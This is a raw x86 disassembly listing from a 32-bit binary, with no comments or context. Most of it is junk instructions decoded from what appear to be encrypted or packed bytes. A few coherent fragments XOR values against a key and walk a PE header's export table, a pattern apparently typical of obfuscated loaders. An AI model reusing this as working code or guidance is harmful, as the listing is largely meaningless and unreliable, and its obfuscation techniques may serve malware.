  40bd74:	xor    eax,esi
  40bd76:	add    eax,eax
  40bd78:	xor    ecx,esi
  40bd7a:	jmp    0x40c0c7
  40bd7f:	push   DWORD PTR [ebx-0xe4f1304]
  40bd85:	outs   dx,DWORD PTR ds:[esi]
  40bd86:	jno    0x40bd30
  40bd88:	mov    dh,0x9c
  40bd8a:	repnz pop ebp
  40bd8c:	push   edx
  40bd8d:	mov    ch,0x9a
  40bd8f:	mov    ecx,0x2e7e7efc
  40bd94:	jge    0x40be14
  40bd96:	jle    0x40bdbc
  40bd98:	test   DWORD PTR [edx-0x3a],ebp
  40bd9b:	push   ebp
  40bd9c:	add    DWORD PTR [edi-0xd],esp
  40bd9f:	fidiv  WORD PTR [edi]
  40bda1:	inc    esi
  40bda2:	inc    BYTE PTR [eax+0x20cab5aa]
  40bda8:	sub    al,0x6a
  40bdaa:	lock push ecx
  40bdac:	ror    DWORD PTR [esi],1
  40bdae:	pop    ebp
  40bdaf:	pop    ds
  40bdb0:	inc    esi
  40bdb1:	sub    ch,BYTE PTR [ebp-0x64]
  40bdb4:	push   edi
  40bdb5:	inc    edx
  40bdb6:	repnz or WORD PTR [ebx-0x83ad46e],ax
  40bdbe:	adc    bh,BYTE PTR [edx-0x1dee675]
  40bdc4:	out    0x1c,eax
  40bdc6:	pop    ds
  40bdc7:	mov    DWORD PTR ds:0x49af9338,edi
  40bdcd:	loopne 0x40be0c
  40bdcf:	retf   
  40bdd0:	mov    ebp,0xa5c870f9
  40bdd5:	das    
  40bdd6:	push   esi
  40bdd7:	je     0x40be3d
  40bdd9:	xchg   esp,eax
  40bdda:	adc    al,0xb3
  40bddc:	cld    
  40bddd:	xor    esi,DWORD PTR [esi+0x15]
  40bde0:	(bad)  
  40bde1:	rcl    BYTE PTR [esi-0x6c],1
  40bde4:	fisttp QWORD PTR [eax]
  40bde6:	jecxz  0x40be44
  40bde8:	xor    DWORD PTR [ebx],esi
  40bdea:	(bad)  
  40bdeb:	mov    ah,0xc5
  40bded:	lock stos DWORD PTR es:[edi],eax
  40bdef:	and    ecx,DWORD PTR [esi-0x2c505c59]
  40bdf5:	(bad)  
  40bdf6:	outs   dx,BYTE PTR ds:[esi]
  40bdf7:	and    al,0x0
  40bdf9:	sub    BYTE PTR [ecx-0x48],0xc4
  40bdfd:	fsubr  st,st(7)
  40bdff:	int    0x74
  40be01:	data16 scas al,BYTE PTR es:[edi]
  40be03:	mov    esp,0x6368b3c1
  40be08:	(bad)  
  40be09:	push   esp
  40be0a:	jbe    0x40bd9b
  40be0c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40be0d:	sar    DWORD PTR [esi+0x7],1
  40be10:	and    ecx,DWORD PTR [edi-0xb]
  40be13:	enter  0xdd17,0x83
  40be17:	lea    ebx,[edi+0x63]
  40be1a:	int3   
  40be1b:	xor    BYTE PTR es:[esp-0x27543110],al
  40be23:	in     al,dx
  40be24:	arpl   WORD PTR [eax+0x7b],bx
  40be27:	push   esi
  40be28:	jne    0x40bdf1
  40be2a:	and    ch,BYTE PTR [eax-0x4f59daa0]
  40be30:	mov    esp,DWORD PTR [edx]
  40be32:	and    DWORD PTR [ecx+0x49],0xfe4914a0
  40be39:	fadd   QWORD PTR [edx]
  40be3b:	sub    BYTE PTR [edx],ch
  40be3d:	imul   esp,DWORD PTR [eax+0x4b],0x2c8e2f53
  40be44:	sub    eax,0xe2c281f4
  40be49:	sar    DWORD PTR [ecx],0xcb
  40be4c:	pop    ebp
  40be4d:	sahf   
  40be4e:	(bad)  
  40be4f:	fdivr  st(2),st
  40be51:	mov    fs,WORD PTR [esp+eax*2]
  40be54:	push   es
  40be55:	ror    DWORD PTR [ecx-0xa5fa67a],1
  40be5b:	(bad)  
  40be5c:	pushf  
  40be5d:	ds in  al,dx
  40be5f:	aad    0xc3
  40be61:	mov    edi,0x5e754183
  40be66:	dec    esp
  40be67:	aas    
  40be68:	inc    ecx
  40be69:	adc    al,0xcf
  40be6b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40be6c:	fwait
  40be6d:	dec    eax
  40be6e:	adc    edi,esp
  40be70:	add    al,0xeb
  40be72:	mov    BYTE PTR [ebx+0x3d2caef0],al
  40be78:	pop    esp
  40be79:	inc    esi
  40be7a:	pop    esi
  40be7b:	dec    ecx
  40be7c:	sbb    al,0x16
  40be7e:	mov    WORD PTR [ecx-0x18],?
  40be81:	adc    BYTE PTR [ebx],ah
  40be83:	dec    eax
  40be84:	xchg   DWORD PTR [edi+ebp*8-0x357d5b99],esi
  40be8b:	mov    al,ds:0x86550042
  40be90:	rcr    ebp,cl
  40be92:	inc    esi
  40be93:	xchg   edx,eax
  40be94:	repz mov eax,ds:0xd94b5a70
  40be9a:	dec    eax
  40be9b:	aad    0x6c
  40be9d:	mov    esi,0xe4c1213b
  40bea2:	(bad)  
  40bea3:	in     al,dx
  40bea4:	(bad)  
  40bea6:	inc    edi
  40bea7:	int    0xb9
  40bea9:	adc    ebp,DWORD PTR [ecx]
  40beab:	xchg   edi,eax
  40beac:	xchg   edi,eax
  40bead:	sub    ch,BYTE PTR [ebp-0x8]
  40beb0:	aaa    
  40beb1:	data16 lock (bad) 
  40beb4:	pop    ecx
  40beb5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40beb6:	pop    edx
  40beb7:	adc    BYTE PTR ds:0x3d12c746,dh
  40bebd:	jo     0x40be4f
  40bebf:	cmp    al,0xe2
  40bec1:	jbe    0x40bed5
  40bec3:	push   ds
  40bec4:	mov    eax,0xf1676809
  40bec9:	jb     0x40bf23
  40becb:	cmp    al,0x17
  40becd:	mov    edx,0x9aeb1952
  40bed2:	aam    0x94
  40bed4:	pop    ss
  40bed5:	retf   
  40bed6:	outs   dx,DWORD PTR ds:[esi]
  40bed7:	out    0xbf,eax
  40bed9:	or     eax,0x21699f9a
  40bede:	daa    
  40bedf:	loope  0x40be97
  40bee1:	pusha  
  40bee2:	shr    BYTE PTR [ebx],1
  40bee4:	stos   DWORD PTR es:[edi],eax
  40bee5:	and    BYTE PTR [edx],0x97
  40bee8:	clc    
  40bee9:	sub    bl,dl
  40beeb:	leave  
  40beec:	ret    
  40beed:	mov    ss,WORD PTR [ebx+0x38]
  40bef0:	in     eax,0x42
  40bef2:	ja     0x40bec6
  40bef4:	lahf   
  40bef5:	push   ecx
  40bef6:	arpl   WORD PTR [ecx-0x5c],bp
  40bef9:	std    
  40befa:	je     0x40bf01
  40befc:	mul    edi
  40befe:	test   eax,0x29baf46e
  40bf03:	mov    edi,0x7e0dc797
  40bf08:	and    edx,DWORD PTR [esi+0x32af03e4]
  40bf0e:	cwde   
  40bf0f:	cmp    bl,BYTE PTR [ecx-0x6b]
  40bf12:	mov    dl,0x71
  40bf14:	data16 aaa 
  40bf16:	mov    bl,0xca
  40bf18:	out    dx,al
  40bf19:	jae    0x40bf3a
  40bf1b:	test   edx,ecx
  40bf1d:	imul   ecx,DWORD PTR [edi+0x8aafabd],0x45f369a6
  40bf27:	cdq    
  40bf28:	leave  
  40bf29:	xor    ecx,DWORD PTR [edi-0x549bc8df]
  40bf2f:	and    BYTE PTR [ebx-0x740c5ad5],bl
  40bf35:	int3   
  40bf36:	mov    al,0x39
  40bf38:	fldcw  WORD PTR [edi+0xc]
  40bf3b:	add    esi,0xffffff9a
  40bf3e:	mov    cl,BYTE PTR [ebx-0x15]
  40bf41:	out    dx,al
  40bf42:	inc    ecx
  40bf43:	(bad)  
  40bf44:	out    dx,eax
  40bf45:	inc    ebx
  40bf46:	push   0xffffffd0
  40bf48:	js     0x40bf2d
  40bf4a:	xor    al,0xb0
  40bf4c:	sub    BYTE PTR ds:0x7d98ddd7,dl
  40bf52:	mov    dl,0x87
  40bf54:	div    ah
  40bf56:	stc    
  40bf57:	lods   al,BYTE PTR ds:[esi]
  40bf58:	add    ah,BYTE PTR [ecx]
  40bf5a:	pop    es
  40bf5b:	les    ecx,FWORD PTR [ecx+eax*8]
  40bf5e:	xor    al,BYTE PTR [esi-0xabe6ce0]
  40bf64:	inc    ecx
  40bf65:	push   ebp
  40bf66:	sti    
  40bf67:	in     eax,dx
  40bf68:	sub    eax,0x96315124
  40bf6d:	pop    edx
  40bf6e:	out    0x9d,eax
  40bf70:	cmp    eax,0x5742de89
  40bf75:	pop    edi
  40bf76:	jp     0x40bf4d
  40bf78:	xor    al,0x4d
  40bf7a:	scas   eax,DWORD PTR es:[edi]
  40bf7b:	gs js  0x40bf52
  40bf7e:	loopne 0x40bf69
  40bf80:	gs push cs
  40bf82:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bf83:	lahf   
  40bf84:	jmp    0xb8bf:0x4767b328
  40bf8b:	call   0x77ac77ae
  40bf90:	cwde   
  40bf91:	adc    eax,0xd0b9b16
  40bf96:	mov    edx,edi
  40bf98:	sub    DWORD PTR [esi+0x9a41f0e],eax
  40bf9e:	imul   ecx,DWORD PTR [ecx+0x17],0xffffffdd
  40bfa2:	sub    ebx,esp
  40bfa4:	cli    
  40bfa5:	in     al,dx
  40bfa6:	xchg   ebx,eax
  40bfa7:	std    
  40bfa8:	hlt    
  40bfa9:	scas   al,BYTE PTR es:[edi]
  40bfaa:	xor    BYTE PTR [edi-0x15ac4bc0],bh
  40bfb0:	xor    al,0x54
  40bfb2:	(bad)  
  40bfb3:	mov    ds:0xa4bf1800,al
  40bfb8:	pop    esp
  40bfb9:	pop    ecx
  40bfba:	(bad)  
  40bfbb:	dec    edi
  40bfbc:	jno    0x40bfa7
  40bfbe:	jecxz  0x40bf61
  40bfc0:	int    0xae
  40bfc2:	xchg   edi,eax
  40bfc3:	pop    esp
  40bfc4:	pop    esp
  40bfc5:	cmp    al,0xa2
  40bfc7:	push   cs
  40bfc8:	test   DWORD PTR [esi+0x75],esp
  40bfcb:	sbb    ch,dh
  40bfcd:	xchg   ecx,eax
  40bfce:	pop    ecx
  40bfcf:	icebp  
  40bfd0:	sub    DWORD PTR [ebp+0x4ba40140],ebp
  40bfd6:	rcr    BYTE PTR [edx+0x14c379b4],0x47
  40bfdd:	or     BYTE PTR [edx],bl
  40bfdf:	mov    ch,0x27
  40bfe1:	mov    eax,ds:0x7eb1780f
  40bfe6:	and    DWORD PTR [edi],ebx
  40bfe8:	mov    ebp,esp
  40bfea:	inc    edi
  40bfeb:	mov    dh,BYTE PTR [edx-0x36cb7e81]
  40bff1:	cld    
  40bff2:	jmp    0x40c02f
  40bff4:	cdq    
  40bff5:	and    al,0xb
  40bff7:	cmp    DWORD PTR [eax+0x698f7e79],ecx
  40bffd:	push   ss
  40bffe:	test   DWORD PTR [edi+0x420b5db7],ecx
  40c004:	push   0xbc42637b
  40c009:	jg     0x40c03f
  40c00b:	add    ebx,eax
  40c00d:	imul   esp,DWORD PTR [eax+0x19],0x68
  40c011:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c012:	pop    edi
  40c013:	fcmovbe st,st(3)
  40c015:	pop    ds
  40c016:	add    eax,0x1aca64e7
  40c01b:	jns    0x40bfa2
  40c01d:	cwde   
  40c01e:	jbe    0x40c040
  40c020:	cmp    bh,bh
  40c022:	sub    eax,0xe073253d
  40c027:	das    
  40c028:	int    0x58
  40c02a:	ja     0x40bfad
  40c02c:	sti    
  40c02d:	mov    esi,0x35efb49c
  40c032:	mov    edi,0xb39ff940
  40c037:	add    al,0xc5
  40c039:	vmovdqu xmm5,xmm7
  40c03d:	xor    DWORD PTR [edx-0x78e50948],edx
  40c043:	dec    ah
  40c045:	mov    ecx,0x7c8b2177
  40c04a:	inc    edi
  40c04b:	rol    BYTE PTR [ebp+0x5d],0xf9
  40c04f:	into   
  40c050:	std    
  40c051:	imul   edi,DWORD PTR [ebx-0x24ec49fe],0xa4a98264
  40c05b:	fstp   TBYTE PTR ds:[edx+0x1f]
  40c05f:	rol    BYTE PTR ds:0x8955b3cc,1
  40c065:	xchg   edi,eax
  40c066:	mov    eax,ds:0xaae3a67
  40c06b:	repz ss adc ebp,esp
  40c06f:	ss push ebx
  40c071:	in     eax,0xfa
  40c073:	out    0xcd,al
  40c075:	(bad)  
  40c076:	or     esp,DWORD PTR [ecx]
  40c078:	mov    esi,0x75929369
  40c07d:	adc    ch,al
  40c07f:	push   si
  40c081:	aaa    
  40c082:	mov    ds:0x8abde7ef,al
  40c087:	mov    al,ds:0xb7bb2e71
  40c08c:	es push esp
  40c08e:	stos   BYTE PTR es:[edi],al
  40c08f:	lea    edx,[edi]
  40c091:	imul   esp,DWORD PTR [ebp+0x5c],0xffffffa2
  40c095:	mov    edx,0x83bd8feb
  40c09a:	jmp    0x8872:0x5bb11730
  40c0a1:	fidiv  WORD PTR [ebx+0x66d36c49]
  40c0a7:	ins    DWORD PTR es:[edi],dx
  40c0a8:	fs cwde 
  40c0aa:	jl     0x40c0f4
  40c0ac:	pop    esi
  40c0ad:	mov    esi,DWORD PTR [esi+ebp*4]
  40c0b0:	fdiv   st(5),st
  40c0b2:	xor    edx,DWORD PTR [edx-0x1056f66a]
  40c0b8:	sbb    BYTE PTR [eax+ecx*1],cl
  40c0bb:	int    0xe
  40c0bd:	and    ebp,ecx
  40c0bf:	std    
  40c0c0:	push   esi
  40c0c1:	sbb    DWORD PTR gs:[eax],0x2b4b5a6d
  40c0c8:	enter  0x8b66,0x45
  40c0cc:	cld    
  40c0cd:	movzx  eax,ax
  40c0d0:	sub    ecx,edi
  40c0d2:	cmp    eax,ecx
  40c0d4:	mov    eax,DWORD PTR [ebp-0x14]
  40c0d7:	movzx  ecx,WORD PTR [ebp-0x4]
  40c0db:	jg     0x40c0f0
  40c0e1:	xor    eax,esi
  40c0e3:	sub    ecx,eax
  40c0e5:	sub    ecx,edi
  40c0e7:	mov    WORD PTR [ebp-0x4],cx
  40c0eb:	jmp    0x40c44a
  40c0f0:	xor    eax,esi
  40c0f2:	jmp    0x40c43f
  40c0f7:	nop
  40c0f8:	push   esp
  40c0f9:	in     al,dx
  40c0fa:	shr    eax,1
  40c0fc:	jno    0x40c0af
  40c0fe:	push   ebp
  40c0ff:	mov    ss,WORD PTR [ecx+esi*8+0x70]
  40c103:	mov    dh,0x21
  40c105:	outs   dx,BYTE PTR ds:[si]
  40c107:	imul   edi,ebx,0x7d2e7e7e
  40c10d:	jle    0x40c18d
  40c10f:	add    edi,eax
  40c111:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c112:	push   eax
  40c113:	sbb    edi,ebp
  40c115:	adc    cl,BYTE PTR [esi]
  40c117:	mov    esp,0x1bba28e4
  40c11c:	rcr    DWORD PTR [edi+0x89aa155],cl
  40c122:	inc    ecx
  40c123:	in     eax,0x28
  40c125:	add    ebp,DWORD PTR [eax+esi*4+0x48]
  40c129:	and    eax,DWORD PTR [edx+edx*2+0x72]
  40c12d:	jge    0x40c140
  40c12f:	and    esi,edx
  40c131:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c132:	jno    0x40c0d3
  40c134:	(bad)  
  40c135:	xchg   esp,eax
  40c136:	mov    BYTE PTR [ecx+edx*8-0x18],ah
  40c13a:	mov    ecx,edx
  40c13c:	ds lahf 
  40c13e:	or     BYTE PTR [edx],bl
  40c140:	gs je  0x40c10a
  40c143:	push   DWORD PTR [edi-0x4b]
  40c146:	rcr    BYTE PTR [eax-0xf8a7b39],cl
  40c14c:	jmp    0x8827:0x88edee68
  40c153:	mul    DWORD PTR [ebx+0x78]
  40c156:	mov    eax,ds:0x3e8ed987
  40c15b:	jge    0x40c151
  40c15d:	jmp    0xddcb:0x87c20a93
  40c164:	int3   
  40c165:	fstp   QWORD PTR [ecx-0x38]
  40c168:	sbb    BYTE PTR [edx+0x69],bl
  40c16b:	mov    ds:0xdd1fc94d,al
  40c170:	push   esp
  40c171:	mov    edx,0x90cbab12
  40c176:	ss push edi
  40c178:	cli    
  40c179:	(bad)  
  40c17a:	int3   
  40c17b:	push   es
  40c17c:	sar    BYTE PTR [ebx],cl
  40c17e:	jo     0x40c1fa
  40c180:	jle    0x40c152
  40c182:	(bad)  
  40c183:	inc    esp
  40c184:	mov    ebx,0xc196e1b6
  40c189:	mov    ch,0xd9
  40c18b:	inc    esp
  40c18c:	inc    eax
  40c18d:	ss cs push edx
  40c190:	add    esi,esi
  40c192:	sbb    esp,DWORD PTR [esi]
  40c194:	xlat   BYTE PTR ds:[ebx]
  40c195:	mov    eax,0x5ecb69c6
  40c19a:	enter  0x6219,0x18
  40c19e:	rcl    esi,1
  40c1a0:	jae    0x40c184
  40c1a2:	ret    0x8f45
  40c1a5:	sub    DWORD PTR [edx+0x167787e0],esp
  40c1ab:	pushf  
  40c1ac:	fs arpl si,si
  40c1af:	push   0xffffffa7
  40c1b1:	bound  edx,QWORD PTR [ebp+0x6]
  40c1b4:	in     eax,0x32
  40c1b6:	ret    
  40c1b7:	xor    al,0xe1
  40c1b9:	xor    ecx,DWORD PTR [ebp+esi*4-0x12]
  40c1bd:	lods   eax,DWORD PTR ds:[esi]
  40c1be:	arpl   dx,di
  40c1c0:	pushf  
  40c1c1:	cwde   
  40c1c2:	retf   
  40c1c3:	pop    edi
  40c1c4:	cs xchg edi,eax
  40c1c6:	mov    ebx,DWORD PTR [ecx+0x4489a705]
  40c1cc:	je     0x40c213
  40c1ce:	inc    ebp
  40c1cf:	push   0xffffffe3
  40c1d1:	lock aaa 
  40c1d3:	and    eax,DWORD PTR [ebp-0x4a]
  40c1d6:	popf   
  40c1d7:	xor    ecx,esi
  40c1d9:	shr    ebp,cl
  40c1db:	xor    bl,ah
  40c1dd:	pop    ds
  40c1de:	mov    edi,esi
  40c1e0:	add    ah,BYTE PTR [ebx-0x465c0578]
  40c1e6:	lds    eax,FWORD PTR [ebx-0x1d]
  40c1e9:	and    esp,edi
  40c1eb:	or     esp,eax
  40c1ed:	sbb    eax,0x4913f765
  40c1f2:	jmp    0x40c1b4
  40c1f4:	loope  0x40c242
  40c1f6:	push   es
  40c1f7:	jmp    0xfe43:0xcad69a36
  40c1fe:	test   al,0x49
  40c200:	loopne 0x40c271
  40c202:	cwde   
  40c203:	sub    al,0xd1
  40c205:	repnz fmul QWORD PTR [edi+0x1b76fdb3]
  40c20c:	cld    
  40c20d:	push   esp
  40c20e:	add    ebx,edi
  40c210:	push   es
  40c211:	rep lods eax,DWORD PTR ds:[esi]
  40c213:	adc    ecx,DWORD PTR [esi+eax*2]
  40c216:	and    al,0x34
  40c218:	cld    
  40c219:	mov    ecx,0x5011125a
  40c21e:	and    ch,BYTE PTR [ebx+0x35]
  40c221:	outs   dx,DWORD PTR ds:[esi]
  40c222:	repnz std 
  40c224:	mov    ebp,0xe387409a
  40c229:	xor    DWORD PTR [esi-0x5cc3522f],ebp
  40c22f:	jno    0x40c244
  40c231:	cli    
  40c232:	xor    eax,0xbd21dd87
  40c237:	pop    ebp
  40c238:	xchg   ebp,ebx
  40c23a:	add    bl,0xdd
  40c23d:	in     al,dx
  40c23e:	(bad)  
  40c23f:	mov    ch,0xbd
  40c241:	ror    BYTE PTR ds:0x65e8d636,1
  40c247:	fild   QWORD PTR [ecx-0x56]
  40c24a:	mov    dh,0x83
  40c24c:	test   eax,0x52a8e2df
  40c251:	mov    edx,DWORD PTR [esp+ebp*8-0x60e9c5d7]
  40c258:	arpl   cx,cx
  40c25a:	mov    ebx,0x143f1e38
  40c25f:	xor    al,0xf8
  40c261:	icebp  
  40c262:	(bad)  
  40c263:	hlt    
  40c264:	jb     0x40c2e0
  40c266:	fdivr  DWORD PTR [ebx]
  40c268:	fiadd  DWORD PTR [ecx]
  40c26a:	leave  
  40c26b:	(bad)  
  40c26d:	test   DWORD PTR [eax],esi
  40c26f:	cmp    DWORD PTR [ebx+eiz*4-0x27],ebx
  40c273:	xchg   DWORD PTR [ebx+0x14],esi
  40c276:	sub    DWORD PTR [ecx+0x4befda1],ecx
  40c27c:	sub    eax,0x7551df8e
  40c281:	pop    edx
  40c282:	push   esi
  40c283:	rcr    BYTE PTR [ebp+0x0],1
  40c286:	cli    
  40c287:	push   ebp
  40c288:	sbb    esi,DWORD PTR [esi+edi*2-0x19]
  40c28c:	jge    0x40c221
  40c28e:	xor    eax,0xa0c69b6d
  40c293:	test   BYTE PTR [eax],0x12
  40c296:	mov    al,ds:0xd0a5ee06
  40c29b:	jbe    0x40c2cd
  40c29d:	cmc    
  40c29e:	fwait
  40c29f:	in     al,dx
  40c2a0:	push   eax
  40c2a1:	rcr    DWORD PTR [ebx],0xf5
  40c2a4:	ja     0x40c321
  40c2a6:	xor    edi,DWORD PTR [eax]
  40c2a8:	scas   eax,DWORD PTR es:[edi]
  40c2a9:	mov    ?,WORD PTR [esi+0x3f]
  40c2ac:	(bad)  
  40c2ad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c2ae:	push   edi
  40c2af:	and    DWORD PTR [esi],esp
  40c2b1:	sbb    ah,BYTE PTR [eax+0x12]
  40c2b4:	aad    0x72
  40c2b6:	jle    0x40c265
  40c2b8:	or     DWORD PTR [edx+0x61],eax
  40c2bb:	scas   al,BYTE PTR es:[edi]
  40c2bc:	cmp    BYTE PTR [ebp-0x35812979],al
  40c2c2:	jae    0x40c285
  40c2c4:	mov    dl,0x62
  40c2c6:	test   DWORD PTR [esi+0x1c2c11dc],edi
  40c2cc:	xor    ebx,DWORD PTR [edx]
  40c2ce:	mov    dl,0x9c
  40c2d0:	jecxz  0x40c2ba
  40c2d2:	test   al,0xa5
  40c2d4:	adc    eax,0x29d0634a
  40c2d9:	push   edi
  40c2da:	imul   edi,DWORD PTR [eax+0x6b],0xa734cddf
  40c2e1:	cs scas al,BYTE PTR es:[edi]
  40c2e3:	pop    edi
  40c2e4:	outs   dx,DWORD PTR ds:[esi]
  40c2e5:	inc    eax
  40c2e6:	pop    esi
  40c2e7:	mov    al,0x1f
  40c2e9:	ins    DWORD PTR es:[edi],dx
  40c2ea:	test   eax,0x8b063c53
  40c2ef:	xchg   edi,eax
  40c2f0:	pop    ecx
  40c2f1:	xchg   esp,eax
  40c2f2:	and    al,al
  40c2f4:	sbb    BYTE PTR [edi],ah
  40c2f6:	popa   
  40c2f7:	or     DWORD PTR [edi+esi*1+0x5f],0xffffffab
  40c2fc:	les    esi,FWORD PTR [ebx+0x75]
  40c2ff:	jnp    0x40c313
  40c301:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c302:	mov    ch,0x53
  40c304:	stos   BYTE PTR es:[edi],al
  40c305:	in     al,dx
  40c306:	sub    BYTE PTR [ebp+0x42],al
  40c309:	xor    eax,DWORD PTR [edi-0x79]
  40c30c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c30d:	aas    
  40c30e:	push   esi
  40c30f:	sub    al,0x31
  40c311:	adc    DWORD PTR [edx+eiz*1-0x1abe6c3f],esi
  40c318:	xor    ch,BYTE PTR [ebp+0x2c]
  40c31b:	mov    bl,0x16
  40c31d:	stos   DWORD PTR es:[edi],eax
  40c31e:	push   cs
  40c31f:	xlat   BYTE PTR ds:[ebx]
  40c320:	add    DWORD PTR [ebx-0x22],esp
  40c323:	mov    al,0xb7
  40c325:	cmp    al,0x5c
  40c327:	push   ds
  40c328:	retf   0x6875
  40c32b:	mov    dh,0x58
  40c32d:	pop    ebp
  40c32e:	ins    DWORD PTR es:[edi],dx
  40c32f:	inc    edx
  40c330:	push   ebx
  40c331:	nop
  40c332:	push   ss
  40c333:	xor    BYTE PTR ds:0x2c0d8e77,0x7c
  40c33a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c33b:	pop    esi
  40c33c:	mov    DWORD PTR [ebp-0x63],esp
  40c33f:	mov    dl,0x10
  40c341:	cmp    al,0xf2
  40c343:	sbb    ebp,ebx
  40c345:	xchg   edx,eax
  40c346:	jp     0x40c313
  40c348:	sub    bh,ch
  40c34a:	test   eax,0x9f363ee
  40c34f:	int    0xc9
  40c351:	popw   ds
  40c353:	outs   dx,BYTE PTR ds:[esi]
  40c354:	ins    BYTE PTR es:[edi],dx
  40c355:	dec    ebp
  40c356:	js     0x40c30f
  40c358:	(bad)  
  40c359:	aas    
  40c35a:	das    
  40c35b:	mov    edx,0xe89e2072
  40c360:	(bad)  
  40c361:	xor    DWORD PTR ds:[esi-0x5f429d50],esi
  40c368:	shl    BYTE PTR ss:[esi+ecx*4-0x531c5301],0x44
  40c371:	aam    0xa7
  40c373:	popa   
  40c374:	dec    eax
  40c375:	(bad)  
  40c376:	cmp    al,0xdf
  40c378:	pop    ebx
  40c379:	(bad)  
  40c37a:	bound  ecx,QWORD PTR [ebp+0xb30fb99]
  40c380:	jecxz  0x40c30e
  40c382:	jbe    0x40c32c
  40c384:	jecxz  0x40c349
  40c386:	cmp    bl,BYTE PTR [ebp-0xe]
  40c389:	sti    
  40c38a:	jnp    0x40c398
  40c38c:	sub    dl,BYTE PTR [edx-0x37]
  40c38f:	outs   dx,DWORD PTR ds:[esi]
  40c390:	dec    edi
  40c391:	(bad)  
  40c392:	in     eax,0x73
  40c394:	add    eax,0xc7f705f7
  40c399:	scas   eax,DWORD PTR es:[edi]
  40c39a:	sahf   
  40c39b:	fmul   st,st(5)
  40c39d:	adc    esp,edi
  40c39f:	mov    edi,fs
  40c3a1:	dec    ebp
  40c3a2:	and    al,0xa6
  40c3a4:	inc    esp
  40c3a5:	fs mov esi,0xddf55dad
  40c3ab:	add    al,dh
  40c3ad:	push   ecx
  40c3ae:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  40c3b0:	push   esp
  40c3b1:	in     eax,dx
  40c3b2:	loope  0x40c3d6
  40c3b4:	push   edi
  40c3b5:	cmp    bh,BYTE PTR [eax+0x62]
  40c3b8:	clc    
  40c3b9:	and    esp,DWORD PTR [eax-0xf]
  40c3bc:	in     eax,0x48
  40c3be:	test   eax,0x1ad2fe0b
  40c3c3:	mov    ecx,0x349fa34
  40c3c8:	or     bh,BYTE PTR [edi-0x5c]
  40c3cb:	jg     0x40c3ef
  40c3cd:	add    eax,0xfabf42ac
  40c3d2:	sbb    al,0x1a
  40c3d4:	mov    ds:0xaf3907c6,eax
  40c3d9:	inc    ebx
  40c3da:	xor    bh,bh
  40c3dc:	pop    es
  40c3dd:	jp     0x40c3ce
  40c3df:	outs   dx,DWORD PTR ss:[esi]
  40c3e1:	mov    eax,ds:0xb3378b43
  40c3e6:	push   es
  40c3e7:	popf   
  40c3e8:	test   BYTE PTR [edx-0x49ad26a7],cl
  40c3ee:	xor    al,0xb2
  40c3f0:	inc    ebp
  40c3f1:	lahf   
  40c3f2:	mov    ecx,0xbd39217e
  40c3f7:	mov    ds:0x83ece735,al
  40c3fc:	push   0x1298f615
  40c401:	cmp    eax,0x52b95900
  40c406:	sbb    eax,0x2fd255c
  40c40b:	jmp    0x2ae4ead5
  40c410:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c411:	sbb    BYTE PTR [eax+0x6b],cl
  40c414:	jns    0x40c441
  40c416:	call   0xc6952285
  40c41b:	push   ds
  40c41c:	mov    eax,ds:0xe45c92b0
  40c421:	or     DWORD PTR [edx+0x4ff74ffe],eax
  40c427:	sub    BYTE PTR [eax],0x4
  40c42a:	lods   al,BYTE PTR ds:[esi]
  40c42b:	in     eax,dx
  40c42c:	iret   
  40c42d:	jmp    0xfe3b:0x847d3be6
  40c434:	mov    eax,0x4f2457b8
  40c439:	loop   0x40c45e
  40c43b:	inc    esp
  40c43c:	xchg   DWORD PTR ds:[eax-0x64f77b73],ebp
  40c443:	jb     0x40c477
  40c445:	add    BYTE PTR [esi-0x77],ah
  40c448:	inc    ebp
  40c449:	cld    
  40c44a:	mov    eax,DWORD PTR [ebp-0xc]
  40c44d:	cmp    eax,ebx
  40c44f:	je     0x40c463
  40c455:	mov    eax,DWORD PTR [ebp-0x8]
  40c458:	mov    DWORD PTR [eax],0x60341e89
  40c45e:	jmp    0x40cba4
  40c463:	mov    eax,DWORD PTR [ebp+0x8]
  40c466:	mov    ecx,DWORD PTR [ebp-0x8]
  40c469:	xor    eax,esi
  40c46b:	add    eax,edi
  40c46d:	cmp    DWORD PTR [ecx],eax
  40c46f:	je     0x40cb8c
  40c475:	mov    ecx,DWORD PTR [ebp-0x18]
  40c478:	mov    eax,DWORD PTR [ebp-0x8]
  40c47b:	mov    eax,DWORD PTR [eax]
  40c47d:	mov    eax,DWORD PTR [eax+0x3c]
  40c480:	lea    ecx,[ecx*8+0x78]
  40c487:	add    eax,ecx
  40c489:	jmp    0x40c7d6
  40c48e:	ffree  st(2)
  40c490:	les    esp,FWORD PTR ds:0xc2dd21e1
  40c496:	xchg   ebp,eax
  40c497:	(bad)  
  40c498:	sub    edx,DWORD PTR [edi-0x51]
  40c49b:	rcl    BYTE PTR [ecx+0x7e871934],0x7e
  40c4a2:	cs jge 0x40c523
  40c4a5:	jle    0x40c4e8
  40c4a7:	jne    0x40c4fe
  40c4a9:	mov    ds:0xb94569f1,al
  40c4ae:	push   0xffffffb7
  40c4b0:	fidiv  DWORD PTR [eax]
  40c4b2:	imul   ecx,DWORD PTR [esi+0x37c5a72e],0x79
  40c4b9:	xchg   esi,eax
  40c4ba:	inc    ecx
  40c4bb:	mov    al,0x4
  40c4bd:	xchg   BYTE PTR [edx+0x4f721f6],dh
  40c4c3:	pop    esi
  40c4c4:	into   
  40c4c5:	data16 jae 0x40c4b6
  40c4c8:	add    ebx,DWORD PTR [edx+esi*4-0x18]
  40c4cc:	and    eax,0x6e4d8046
  40c4d1:	icebp  
  40c4d2:	sbb    cl,ah
  40c4d4:	push   ecx
  40c4d5:	ins    BYTE PTR es:[edi],dx
  40c4d6:	das    
  40c4d7:	pop    eax
  40c4d8:	mov    bh,0xc9
  40c4da:	xchg   ecx,eax
